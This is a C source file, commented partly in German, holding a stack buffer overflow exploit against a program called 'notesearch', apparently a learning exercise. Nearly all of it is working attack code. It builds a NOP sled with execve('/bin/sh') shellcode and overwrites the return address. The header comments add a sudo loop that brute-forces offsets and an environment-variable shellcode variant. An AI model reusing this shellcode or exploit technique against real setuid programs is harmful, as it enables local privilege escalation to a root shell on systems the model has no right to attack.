/**
* @file exploit_notesearch.c
* @author Philip Wiese
* @date 28 Sep 2016
* @brief Exploitcode f√ºr Notesearch Programm
*
* Shellcode generiert aus <exec_shell.s> mit 
* #> nasm exec_shell.s
* #> hexdump -v -e '"\\x" 1/1 "%02x" ""' exec_shell; hexdump exec_shell
*
* Exploit is working with:
* User: xeratec #> ./exploit_notesearch 176
* User: root #> ./exploit_notesearch 256
*
* Test Offset:
* #> for i in $(seq 200 1 400)
*  do
*  echo Trying offset $i
*  sudo ./exploit_notesearch $i
*  done
*
* With Environment Variable
* #> export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat exec_shell)
* #> ./notesearch $(perl -e 'print "\x3e\xff\xff\xbf"x29')
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "toolbox.h"

char shellcode[] =
"\xeb\x16\x5b\x31\xc0\x88\x43\x07"
"\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
"\x08\x8d\x53\x0c\xb0\x0b\xcd\x80"
"\xe8\xe5\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


int main(int argc, char *argv[]) {
	unsigned int i, *ptr, ret, offset=192;
	char *command, *buffer;
	
	command = (char *) ec_malloc(200);
	bzero(command, 200);
	
#ifndef DEBUG
	strcpy(command, "./notesearch \'"); //Start command buffer
	buffer = command + strlen(command); // Set Buffer at the end
#endif

#ifdef DEBUG
	buffer = command;
#endif

	if (argc>1) //Set offset
		offset = atoi(argv[1]);
		
	
	ret = (unsigned int) &i - offset; //Set return address.

	
	for (i=0 ; i<20 ; i++) *((unsigned int *) (11*4+buffer+4*i)) = ret;
	 memset(buffer, 0x90, 60); // Build NOP Sled
	 memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

#ifndef DEBUG
	 printf("Address i: %p | Value ret: %p\n", &i, ret); 
	 strcat(command, "\'");
	 system(command);
#endif	 
#ifdef DEBUG
	 printf("%s", buffer);
#endif
	free(command);
}
